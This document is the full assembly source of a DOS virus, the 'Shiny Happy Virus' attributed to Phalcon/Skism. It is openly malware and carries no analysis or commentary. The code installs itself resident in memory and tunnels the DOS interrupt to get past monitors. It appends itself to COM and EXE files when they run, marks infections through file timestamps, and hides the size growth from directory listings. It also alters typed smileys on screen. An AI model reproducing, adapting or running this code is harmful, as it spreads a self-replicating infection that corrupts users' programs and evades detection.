; The Shiny Happy Virus
; By Hellraiser and Dark Angel of Phalcon/Skism

        .model  tiny
        .code

id      =       '52'
timeid  =       18h

shiny:
        call    next
next:   pop     bp

        push    ds
        push    es

        xor     di,di
        mov     ds,di
        cmp     word ptr ds:[1*4],offset int1_2 ; installation check
        jz      return

        mov     ax,es
        dec     ax
        sub     word ptr ds:[413h],(endheap-shiny+1023)/1024
        mov     ds,ax
        sub     word ptr ds:[3],((endheap-shiny+1023)/1024)*64
        sub     word ptr ds:[12h],((endheap-shiny+1023)/1024)*64
        mov     es,word ptr ds:[12h]

        push    cs
        pop     ds

        lea     si,[bp+shiny-next]
        mov     cx,(endheap-shiny+1)/2
        rep     movsw

        push    cs
        lea     ax,[bp+return-next]
        push    ax

        push    es
        mov     ax,offset highentry
        push    ax
        retf

return:
        cmp     sp,id-4
        jz      returnEXE
returnCOM:
        pop     es
        pop     ds
        mov     di,100h
        push    di
        lea     si,[bp+offset save3-next]
        movsw
        movsb
        retn

returnEXE:
        pop     es
        pop     ds
        mov     ax,es
        add     ax,10h
        add     word ptr cs:[bp+origCSIP+2-next],ax
        cli
        add     ax,word ptr cs:[bp+origSPSS-next]
        mov     ss,ax
        mov     sp,word ptr cs:[bp+origSPSS+2-next]
        sti
        db      0eah
origCSIP db     ?
save3    db    0cdh,20h,0
origSPSS dd     ?

highentry:
        mov     cs:in21flag,0

        xor     ax,ax
        mov     ds,ax

        les     ax,ds:[9*4]
        mov     word ptr cs:oldint9,ax
        mov     word ptr cs:oldint9+2,es

        mov     ds:[9*4],offset int9
        mov     ds:[9*4+2],cs

        les     ax,ds:[21h*4]
        mov     word ptr cs:oldint21,ax
        mov     word ptr cs:oldint21+2,es

        mov     word ptr ds:[1*4],offset int1
        mov     ds:[1*4+2],cs

        mov     ah, 52h
        int     21h
        mov     ax,es:[bx-2]
        mov     word ptr cs:tunnel21+2, ax
        mov     word ptr cs:dosseg_, es

        pushf
        pop     ax
        or      ah,1
        push    ax
        popf

        mov     ah,0bh
        pushf
        db      09Ah
oldint21 dd     ?

        mov     word ptr ds:[3*4],offset int3
        mov     ds:[3*4+2],cs
        mov     word ptr ds:[1*4],offset int1_2

        les     bx,cs:tunnel21
        mov     al,0CCh
        xchg    al,byte ptr es:[bx]
        mov     byte ptr cs:save1,al
        retf

authors db 'Shiny Happy Virus by Hellraiser and Dark Angel of Phalcon/Skism',0

int1:   push    bp
        mov     bp,sp
        push    ax

        mov     ax, [bp+4]
        cmp     ax,word ptr cs:tunnel21+2
        jb      foundint21
        db      3dh     ; cmp ax, xxxx
dosseg_ dw      ?
        ja      exitint1
foundint21:
        mov     word ptr cs:tunnel21+2,ax
        mov     ax,[bp+2]
        mov     word ptr cs:tunnel21,ax
        and     byte ptr [bp+7], 0FEh
exitint1:
        pop     ax
        pop     bp
        iret

int1_2: push    bp
        mov     bp,sp
        push    ax

        mov     ax, [bp+4]
        cmp     ax,word ptr cs:tunnel21+2
        ja      exitint1_2
        mov     ax, [bp+2]
        cmp     ax,word ptr cs:tunnel21
        jbe     exitint1_2

        push    ds
        push    bx
        lds     bx,cs:tunnel21
        mov     byte ptr ds:[bx],0CCh
        pop     bx
        pop     ds

        and     byte ptr [bp+7],0FEh
exitint1_2:
        pop     ax
        pop     bp
        iret

infect_others:
        mov     ax,4301h
        push    ax
        push    ds
        push    dx
        xor     cx,cx
        call    callint21

        mov     ax,3d02h
        call    callint21
        xchg    ax,bx

        mov     ax,5700h
        call    callint21
        push    cx
        push    dx

        mov     ah,3fh
        mov     cx,1ah
        push    cs
        pop     ds
        push    cs
        pop     es
        mov     dx,offset readbuffer
        call    callint21

        mov     ax,4202h
        xor     cx,cx
        cwd
        int     21h

        mov     si,offset readbuffer
        cmp     word ptr [si],'ZM'
        jnz     checkCOM
checkEXE:
        cmp     word ptr [si+10h],id
        jz      goalreadyinfected

        mov     di, offset OrigCSIP
        mov     si, offset readbuffer+14h
        movsw
        movsw

        sub     si, 18h-0eh
        movsw
        movsw

        push    bx
        mov     bx, word ptr readbuffer + 8
        mov     cl, 4
        shl     bx, cl

        push    dx
        push    ax

        sub     ax, bx
        sbb     dx, 0

        mov     cx, 10h
        div     cx

        mov     word ptr readbuffer+14h, dx
        mov     word ptr readbuffer+16h, ax

        mov     word ptr readbuffer+0Eh, ax
        mov     word ptr readbuffer+10h, id

        pop     ax
        pop     dx
        pop     bx

        add     ax, heap-shiny
        adc     dx, 0

        mov     cl, 9
        push    ax
        shr     ax, cl
        ror     dx, cl
        stc
        adc     dx, ax
        pop     ax
        and     ah, 1

        mov     word ptr readbuffer+4, dx
        mov     word ptr readbuffer+2, ax

        mov     cx,1ah
        jmp     short finishinfection
checkCOM:
        xchg    cx,ax
        sub     cx,heap-shiny+3
        cmp     cx,word ptr [si+1]
goalreadyinfected:
        jz      alreadyinfected
        add     cx,heap-shiny

        push    si
        mov     di,offset save3
        movsw
        movsb
        pop     di
        mov     al,0e9h
        stosb
        mov     ax,3    ; cx holds bytes to write
        xchg    ax,cx
        stosw
finishinfection:
        push    cx

        mov     ah,40h
        mov     cx,heap-shiny
        cwd ; xor dx,dx
        call    callint21

        mov     ax,4200h
        xor     cx,cx
        cwd
        int     21h

        mov     ah,40h
        pop     cx
        mov     dx,offset readbuffer
        call    callint21

        mov     ax,5701h
        pop     dx
        pop     cx
        and     cl,0E0h
        or      cl,timeid
        call    callint21
        jmp     doneinfect

alreadyinfected:
        pop     ax
        pop     ax
doneinfect:
        mov     ah,3eh
        call    callint21

        pop     dx
        pop     ds
        pop     ax
        pop     cx
        call    callint21
exitexecute:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        popf

        jmp     exitint21

execute:
        pushf
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es

        cld

        mov     ax,4300h
        call    callint21
        jc      exitexecute
        push    cx

        jmp     infect_others

int3:
        push    bp
        mov     bp,sp

        cmp     cs:in21flag,0
        jnz     leaveint21

        inc     cs:in21flag

        cmp     ah,11h
        jz      findfirstnext
        cmp     ah,12h
        jz      findfirstnext
        cmp     ax,4b00h
        jz      execute

exitint21:
        dec     cs:in21flag
leaveint21:
        or      byte ptr [bp+7],1       ; set trap flag upon return
        dec     word ptr [bp+2]         ; decrement offset
        call    restoreint21
        pop     bp
        iret

callint21:
        pushf
        call    dword ptr cs:tunnel21
        ret

restoreint21:
        push    ds
        push    ax
        push    bx

        lds     bx,cs:tunnel21
        mov     al,byte ptr cs:save1
        mov     ds:[bx],al

        pop     bx
        pop     ax
        pop     ds

        ret

findfirstnext:
        int     21h     ; pre-chain interrupt

; flags   [bp+12]
; segment [bp+10]
; offset  [bp+8]
; flags   [bp+6]
; segment [bp+4]
; offset  [bp+2]
; bp      [bp]
        pushf           ; save results
        pop     [bp+6+6]
        pop     bp

        push    ax
        push    bx
        push    ds
        push    es

        inc     al
        jz      notDOS

        mov     ah,51h          ; Get active PSP
        int     21h
        mov     es,bx
        cmp     bx,es:[16h]     ; DOS calling it?
        jne     notDOS

        mov     ah,2fh  ; DTA -> ES:BX
        int     21h
        push    es
        pop     ds

        cmp     byte ptr [bx],0FFh
        jnz     regularFCB
        add     bx,7
regularFCB:
        cmp     word ptr [bx+9],'OC'
        jz      checkinf
        cmp     word ptr [bx+9],'XE'
        jnz     notDOS
checkinf:
        mov     al,byte ptr [bx+23]
        and     al,1Fh

        cmp     al,timeid
        jnz     notDOS
subtract:
        sub     word ptr [bx+29],heap-shiny
        sbb     word ptr [bx+31],0
notDOS:
        pop     es
        pop     ds
        pop     bx
        pop     ax

        dec     cs:in21flag

        cli
        add     sp,6
        iret

int9:
        pushf                           ; save flags, regs, etc...
        push    ax
        push    bx
        push    cx
        push    dx

        xor     bx,bx
        mov     ah,0fh                  ; get video mode
        int     10h

        mov     ah,03h                  ; get curs pos
        int     10h

        call    getattrib
        cmp     al,')'                  ; happy??
        jne     audi5000                ; no

        mov     cs:eyesflag,0
beforeloveshack:
        call    getattrib               ; see if there is a nose
loveshack:
        cmp     al,':'                  ; shiny???
        je      realeyes

        cmp     al,'='                  ; check for even =)
        je      realeyes

        cmp     al,'|'
        je      realeyes

        cmp     al,';'
        je      realeyes

        cmp     cs:eyesflag,0
        jnz     audi5001
        cmp     al,'('
        jz      audi5001
        inc     cs:eyesflag
        inc     bl
        jmp     short beforeloveshack

realeyes:
        stc
        adc     dl,bl                   ; add extra backspace if so

        mov     ah,02h
        int     10h

        mov     ax,0a28h   ; 0ah, '('   ; write frown
        mov     cx,1
        int     10h

        jmp     audi5000
audi5001:
        stc
        adc     dl,bl
audi5000:
        inc     dl                      ; set curs pos
        mov     ah,02h
        int     10h

        pop     dx                      ; restore all stuff
        pop     cx
        pop     bx
        pop     ax
        popf

        db      0eah
oldint9 dd      ?

; reads the char at the current cursorpos - 1

getattrib:
        dec     dl                      ; set curs pos
        mov     ah,02h
        int     10h

        mov     ah,08h                  ; get char at curs
        int     10h

        ret

heap:
save1    db     ?
tunnel21 dd     ?
in21flag db     ?
eyesflag db     ?
readbuffer db   1ah dup (?)
endheap:
end  shiny

